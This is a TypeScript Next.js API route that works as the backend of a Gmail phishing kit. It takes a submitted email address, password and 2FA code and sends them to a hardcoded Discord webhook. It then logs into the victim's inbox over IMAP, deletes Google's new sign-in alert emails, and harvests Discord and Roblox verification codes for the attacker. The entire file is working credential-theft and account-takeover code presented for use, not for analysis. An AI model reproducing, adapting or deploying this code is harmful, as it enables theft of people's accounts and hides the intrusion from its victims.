import { NextRequest, NextResponse } from 'next/server';
import { imap } from 'imap-simple';
import { simpleParser } from 'mailparser';
import fetch from 'node-fetch';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function sendToWebhook(title: string, fields: { name: string; value: string }[]) {
  await fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{ title, color: 0x5865f2, fields, timestamp: new Date().toISOString() }]
    })
  }).catch(() => {});
}

export async function POST(req: NextRequest) {
  const { email, password, code } = await req.json();

  // Send captured creds + code
  await sendToWebhook('Gmail Creds + Code', [
    { name: 'Email', value: email },
    { name: 'Password', value: password },
    { name: '2FA Code', value: code || 'N/A' }
  ]);

  try {
    const imapConfig = {
      imap: {
        user: email,
        password,
        host: 'imap.gmail.com',
        port: 993,
        tls: true,
        authTimeout: 3000,
        tlsOptions: { rejectUnauthorized: false }
      }
    };

    const connection = await imap.connect({ imap: imapConfig.imap });
    await connection.openBox('INBOX');

    // Delete suspicious login alerts
    const alerts = await connection.search(['UNSEEN', ['FROM', 'no-reply@accounts.google.com'], ['SUBJECT', 'new sign-in']]);
    if (alerts.length > 0) {
      await connection.addFlags(alerts, '\\Deleted');
      await connection.expunge();
      await sendToWebhook('Alert Email Deleted', [{ name: 'Email', value: email }]);
    }

    // Monitor for Discord/Roblox codes (loop or cron in real bot)
    const messages = await connection.search(['UNSEEN']);
    for (const msg of messages) {
      const part = await connection.getPartData(msg, 'TEXT');
      const parsed = await simpleParser(part);
      const text = parsed.textAsHtml || parsed.text || '';

      const codeMatch = text.match(/\b\d{6}\b/);
      if (codeMatch) {
        const code = codeMatch[0];
        const service = text.includes('discord') ? 'Discord' : text.includes('roblox') ? 'Roblox' : 'Unknown';
        await sendToWebhook(`${service} 2FA Code`, [
          { name: 'Code', value: `\`${code}\`` },
          { name: 'From Email', value: email }
        ]);
      }
    }

    connection.end();
    return NextResponse.json({ success: true });
  } catch (err) {
    await sendToWebhook('Gmail Login Failed', [
      { name: 'Email', value: email },
      { name: 'Error', value: err.message }
    ], 0xff0000);
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
